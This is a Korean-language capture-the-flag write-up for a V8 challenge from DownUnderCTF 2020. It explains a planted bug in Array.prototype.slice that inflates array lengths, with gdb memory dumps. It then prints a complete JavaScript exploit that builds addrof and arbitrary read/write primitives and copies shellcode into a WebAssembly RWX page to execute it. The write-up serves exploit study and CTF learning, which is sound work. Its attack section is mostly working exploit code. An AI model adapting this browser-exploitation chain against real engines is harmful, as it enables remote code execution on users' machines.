# DownUnderCTF - Is this pwn or web?
chrome v8엔진 관련 문제를 풀어보고자 한다. 본 문제는 깃허브에 [문제](https://github.com/DownUnderCTF/Challenges_2020_public/tree/master/pwn/is-this-pwn-or-web)와 exploit 코드가 있어서 채택했으며, 이를 기반으로 분석하고자한다.

## diff
제공된 diff 파일을 살펴보자.
``` diff
diff --git a/src/builtins/array-slice.tq b/src/builtins/array-slice.tq
index 7b82f2bda3..4b9478f84e 100644
--- a/src/builtins/array-slice.tq
+++ b/src/builtins/array-slice.tq
@@ -101,7 +101,14 @@ macro HandleFastSlice(
         // to be copied out. Therefore, re-check the length before calling
         // the appropriate fast path. See regress-785804.js
         if (SmiAbove(start + count, a.length)) goto Bailout;
-        return ExtractFastJSArray(context, a, start, count);
+        // return ExtractFastJSArray(context, a, start, count);
+        // Instead of doing it the usual way, I've found out that returning it
+        // the following way gives us a 10x speedup!
+        const array: JSArray = ExtractFastJSArray(context, a, start, count);
+        const newLength: Smi = Cast<Smi>(count - start + SmiConstant(2))
+            otherwise Bailout;
+        array.ChangeLength(newLength);
+        return array;
       }
       case (a: JSStrictArgumentsObject): {
         goto HandleSimpleArgumentsSlice(a);
```
slice를 진행할 때, 최종적으로 생성된 JSArray를 그대로 반환하는게 아니라, newLength 변수를 통해 length를 변경하는 작업이 추가된 것을 알 수 있다. `count`와 `start`의 값이 무엇인지 알아보기 위해 원본 v8 코드를 확인해보니 다음과 같은 코드들을 확인할 수 있었다.
``` c
macro HandleFastSlice(
      context: NativeContext, o: JSAny, startNumber: Number,
      countNumber: Number): JSArray
      labels Bailout {
   const start: Smi = Cast<Smi>(startNumber) otherwise Bailout;
   const count: Smi = Cast<Smi>(countNumber) otherwise Bailout;
   assert(start >= 0);

   try {
      typeswitch (o) {
         case (a: FastJSArrayForCopy): {
         // It's possible to modify the array length from a valueOf
         // callback between the original array length read and this
         // point. That can change the length of the array backing store,
         // in the worst case, making it smaller than the region that needs
         // to be copied out. Therefore, re-check the length before calling
         // the appropriate fast path. See regress-785804.js
         if (SmiAbove(start + count, a.length)) goto Bailout;
         return ExtractFastJSArray(context, a, start, count);
         }
   ...
```
각각 호출될 때, 세 번째(startNumber)와 네 번째(countNumber) 인자로 받는다. 호출하는 코드를 기준으로 살펴보면 아래와 같다.
``` c
ArrayPrototypeSlice(
      js-implicit context: NativeContext, receiver: JSAny)(...arguments): JSAny {
   // Handle array cloning case if the receiver is a fast array.
   if (arguments.length == 0) {
      typeswitch (receiver) {
         case (a: FastJSArrayForCopy): {
         return CloneFastJSArray(context, a);
         }
         case (JSAny): {
         }
      }
   }

   // 1. Let O be ? ToObject(this value).
   const o: JSReceiver = ToObject_Inline(context, receiver);

   // 2. Let len be ? ToLength(? Get(O, "length")).
   const len: Number = GetLengthProperty(o);

   // 3. Let relativeStart be ? ToInteger(start).
   const start: JSAny = arguments[0];
   const relativeStart: Number = ToInteger_Inline(start);

   // 4. If relativeStart < 0, let k be max((len + relativeStart), 0);
   //    else let k be min(relativeStart, len).
   let k: Number = relativeStart < 0 ? Max((len + relativeStart), 0) :
                                       Min(relativeStart, len);

   // 5. If end is undefined, let relativeEnd be len;
   //    else let relativeEnd be ? ToInteger(end).
   const end: JSAny = arguments[1];
   const relativeEnd: Number = end == Undefined ? len : ToInteger_Inline(end);

   // 6. If relativeEnd < 0, let final be max((len + relativeEnd), 0);
   //    else let final be min(relativeEnd, len).
   const final: Number =
         relativeEnd < 0 ? Max((len + relativeEnd), 0) : Min(relativeEnd, len);

   // 7. Let count be max(final - k, 0).
   const count: Number = Max(final - k, 0);

   assert(0 <= k);
   assert(k <= len);
   assert(0 <= final);
   assert(final <= len);
   assert(0 <= count);
   assert(count <= len);

   try {
      return HandleFastSlice(context, o, k, count)
         otherwise Slow;
   } label Slow {}
```
`HandleFastSlice` 호출 시, k와 count변수를 전달하는 것을 알 수 있었고, 변수 생성 부분을 살펴보면 k는 slice 시작지점이고, count는 시작지점과 자르는 지점과의 차이(*i.e. 잘라낼 크기*)임을 알 수있다. 결국, 다시 diff로 돌아가보면 `count - start + 2`로 length를 수정하기 때문에 다음과 같은 기이한 현상이 일어난다.
```
d8> a = [1,2,3,4,5,6]
d8> a.slice(4,6).length
0
d8> a.slice(5,6).length
-2
d8> a.slice(0).length()
8
```
원하는 영역을 잘랐는데 0이 될 수도, 음수가 될 수도 있다. 이를 이용해서 `slice(0)`을 하게되면 length에 2가 더해지는 것을 확인할 수 있다.

``` diff
diff --git a/src/objects/js-array.tq b/src/objects/js-array.tq
index a4d4b9d356..7e2738b96e 100644
--- a/src/objects/js-array.tq
+++ b/src/objects/js-array.tq
@@ -26,6 +26,10 @@ macro CreateArrayIterator(implicit context: NativeContext)(
 }
 
 extern class JSArray extends JSObject {
+  macro ChangeLength(newLength: Smi) {
+    this.length = newLength;
+  }
+  
   macro IsEmpty(): bool {
     return this.length == 0;
   }
```
array-slice에서 사용한 ChangeLength는 위와 같이 선언했음을 알 수 있다. 예상했던대로 length를 변경한다. 

## Vuln trigger
실제 메모리를 까보기에 앞서 알아두어야 할 것이 있다. 최신버전 V8에서는 메모리 효율을 향상시키기 위해 [pointer compression](https://v8.dev/blog/pointer-compression)이라는 기법이 적용이 되어서 메모리 분석에 약간의 귀찮음이 생긴다.

기존에는 주소에 -1을 했다면, 이제는 포인터가 4byte로 압축이 된 상태여서 8byte 단위로 보면 알아들을수 없다. 4byte로 끊은 뒤 앞 4byte는 메모리 주소의 상위 4byte를 사용하면 된다.
```
value(8byte) = (메모리주소 상위 4byte) + (주소-1의 4byte 값)
```
실제 데이터를 통해서 확인해보면 아래와 같다.
```
d8> %DebugPrint(b)
DebugPrint: 0x38b080862e9: [JSArray]
 - map: 0x038b0824385d <Map(PACKED_SMI_ELEMENTS)> [FastProperties]
 - prototype: 0x038b0820a555 <JSArray[0]>
 - elements: 0x038b08211ce1 <FixedArray[8]> [PACKED_SMI_ELEMENTS (COW)]
 - length: 8
 - properties: 0x038b080426dd <FixedArray[0]>
```
b라는 배열이 `0x38b080862e9`에 있는 것을 확인할 수 있다. 4byte씩 출력해보면 다음과 같다.
```
gdb-peda$ x/8wx 0x38b080862e9 -1
0x38b080862e8:	0x0824385d	0x080426dd	0x08211ce1	0x00000010
0x38b080862f8:	0x0824394d	0x080426dd	0x0808632d	0x00000010
```
앞서 설명한대로 계산하면 다음과 같은 결과가 나온다.
- (0x38b + 0x0824385d) = 0x038b0824385d = map
- (0x38b + 0x080426dd) = 0x038b082426dd = properties
- (0x38b + 0x08211ce1) = 0x038b08211ce1 = elements

위 방법을 토대로 다음과 같이 float array에서 elements에 해당하는 메모리를 찾을 수 있다. 
```
gdb-peda$ job 0x2934080864ad
0x2934080864ad: [JSArray]
 - map: 0x2934082438fd <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x29340820a555 <JSArray[0]>
 - elements: 0x29340808649d <FixedDoubleArray[1]> [PACKED_DOUBLE_ELEMENTS]
 - length: 3
 - properties: 0x2934080426dd <FixedArray[0]> {
    0x293408044649: [String] in ReadOnlySpace: #length: 0x293408182159 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x29340808649d <FixedDoubleArray[1]> {
           0: 1.1
 }
gdb-peda$ x/16wx 0x29340808649d -1
0x29340808649c:	0x08042a31	0x00000002	0x9999999a	0x3ff19999
0x2934080864ac:	0x082438fd	0x080426dd	0x0808649d	0x00000006
0x2934080864bc:	0x0824394d	0x080426dd	0x080864f5	0x00000006
0x2934080864cc:	0x082422cd	0x080426dd	0x080426dd	0x08042301
```
첫 번재 인덱스인 `0x9999999a	0x3ff19999`데이터 바로 뒤에 `map propertes`쌍이 있다. 이제 원하는 데이터를 write할 수 있다.

## Exploit
공격 순서는 다음과 같다.
1. float 배열의 length를 크게 변조
2. addrof 구현  
   본 익스에서는 `float_arr[4]`로 `addrof_arr[0]`에 접근
3. AR 구현  
   본 익스에서는 `float_arr[17]`로 `arb_read_arr elements`에 접근
4. AW 구현
   본 익스에서는 `float_arr[20]`로 
5. rwx 영역에 쉘코드 넣고 실행


exploit 코드는 다음과 같다.
``` javascript
// ftoi, itof에서 형변환에 사용되는 변수들
var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u32_buf = new Uint32Array(buf);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n);
}

function itof(val) {
    u32_buf[0] = Number(val & 0xffffffffn);
    u32_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function hex(val) {
    return "0x" + val.toString(16);
}

// shellcode를 삽입할 web asm 페이지 생성
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;

console.log("[+] WebAssembly RWX page setup!");

var float_arr = [1.1]; // index로 다양한 메모리 공간에 접근할 float 배열
float_arr = float_arr.slice(0); // 취약점 트리거. length가 2 늘어남.
var addrof_arr = [{}, {}]; // addrof로 주소구할 때 사용할 변수
var arb_read_arr = [1.1]; // AR에 사용할 변수

// AW에 사용할 버퍼
var buf = new ArrayBuffer(0x100);
var dataview = new DataView(buf);

console.log("[+] Corrupting float_arr's length to 2048");

// float으로 읽다보니 8byte씩 읽는데, 최신 v8에서는 데이터가 4byte로 압축되기 때문에
// length와 함께 묶이는 element 주소를 백업해두어야한다.
var float_arr_elem = ftoi(float_arr[2]) & 0xffffffffn;

// 원본 element와 함께 2048byte 만큼 length의 값을 바꿔준다.
float_arr[2] = itof((0x1000n << 32n) + float_arr_elem);

if (float_arr.length === 2048) {
  console.log("[+] Corruption successful!");
} else {
  console.log("[!] Corruption failed. Try again.");
  throw error;
}

// float_arr[4]가 addrof_arr[0]이다.
// addrof_arr로 object를 넣고, float_arr로 주소값을 읽어온다.
function addrof(obj) {
    addrof_arr[0] = obj;
    return ftoi(float_arr[4]) & 0xffffffffn;
}

console.log("[+] Addrof primitive has been setup");

// float_arr[17]이 arb_read_arr 배열의 element포인터다.
// 원하는 주소를 float_arr로 elements pointer에 덮어쓰고,
// arb_read_arr로 elements에 접근해서 값을 읽는다.
function compressed_arb_read(addr) {
    float_arr[17] = itof((0x1000n << 32n) + addr - 8n);
    return ftoi(arb_read_arr[0]);
}

console.log("[+] Arbitrary read primitive for the compressed heap has been setup");

// AW부분. 진행중,,,
function copy_shellcode(addr, shellcode) {
    float_arr[20] = itof((addr & 0xffffffffn) << 32n);
    float_arr[21] = itof((addr & 0xffffffff00000000n) >> 32n);

    for (let i = 0; i < shellcode.length; i++) {
        dataview.setUint32(4*i, shellcode[i], true);
    }
}

var shellcode = [0x99583b6a, 0x622fbb48, 0x732f6e69, 0x48530068, 0x2d68e789, 0x48000063, 0xe852e689, 0x0000000e, 
0x6c662f2e, 0x72706761, 0x65746e69, 0x57560072, 0x0fe68948, 0x00000005];

var rwx_page_addr = compressed_arb_read(addrof(wasm_instance) + 0x68n);

console.log("[+] RWX page address found: " + hex(rwx_page_addr));

console.log("[+] Copying ./flagprinter shellcode to RWX page");
copy_shellcode(rwx_page_addr, shellcode);

console.log("[+] Printing flag!");
f();
```

---
## TODO

`--allow-natives-syntax`에서는 익스안됨. 배열이 다른건가?  
주소 정보 어떻게 디버깅하지,,?


hex(addrof(float_arr))  
hex(addrof(addrof_arr))  
hex(addrof(arb_read_arr))  
hex(addrof(buf))  
hex(addrof(dataview))  

0x3594080864c0:	0x080426dd	0x00000100	0x00000000	0xa8914000

```
d8> hex(addrof(float_arr))
"0x8086431"
d8> hex(addrof(addrof_arr))
"0x8086489"
d8> hex(addrof(arb_read_arr))
"0x80864a9"
d8> hex(addrof(buf))
"0x80864b9"
d8> hex(addrof(dataview))
"0x80864f1"
```

<!-- TODO BLOCK
``` diff
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index 26ccb62c68..8114a861cc 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
@@ -1342,9 +1342,12 @@ MaybeLocal<Context> Shell::CreateRealm(
     }
     delete[] old_realms;
   }
-  Local<ObjectTemplate> global_template = CreateGlobalTemplate(isolate);
+  // Remove globals
+  //Local<ObjectTemplate> global_template = CreateGlobalTemplate(isolate);
   Local<Context> context =
-      Context::New(isolate, nullptr, global_template, global_object);
+      //Context::New(isolate, nullptr, global_template, global_object);
+      Context::New(isolate, nullptr, ObjectTemplate::New(isolate),
+                   v8::MaybeLocal<Value>());
   DCHECK(!try_catch.HasCaught());
   if (context.IsEmpty()) return MaybeLocal<Context>();
   InitializeModuleEmbedderData(context);
@@ -2285,10 +2288,13 @@ void Shell::Initialize(Isolate* isolate, D8Console* console,
             v8::Isolate::kMessageLog);
   }
 
+  // Prevent `import("stuff")`
+  /*
   isolate->SetHostImportModuleDynamicallyCallback(
       Shell::HostImportModuleDynamically);
   isolate->SetHostInitializeImportMetaObjectCallback(
       Shell::HostInitializeImportMetaObject);
+  */
 
 #ifdef V8_FUZZILLI
   // Let the parent process (Fuzzilli) know we are ready.
@@ -2316,9 +2322,11 @@ Local<Context> Shell::CreateEvaluationContext(Isolate* isolate) {
   // This needs to be a critical section since this is not thread-safe
   base::MutexGuard lock_guard(context_mutex_.Pointer());
   // Initialize the global objects
-  Local<ObjectTemplate> global_template = CreateGlobalTemplate(isolate);
+  //Local<ObjectTemplate> global_template = CreateGlobalTemplate(isolate);
   EscapableHandleScope handle_scope(isolate);
-  Local<Context> context = Context::New(isolate, nullptr, global_template);
+  //Local<Context> context = Context::New(isolate, nullptr, global_template);
+  Local<Context> context = Context::New(isolate, nullptr,
+                                        ObjectTemplate::New(isolate));
   DCHECK(!context.IsEmpty());
   if (i::FLAG_perf_prof_annotate_wasm || i::FLAG_vtune_prof_annotate_wasm) {
     isolate->SetWasmLoadSourceMapCallback(ReadFile);
```
-->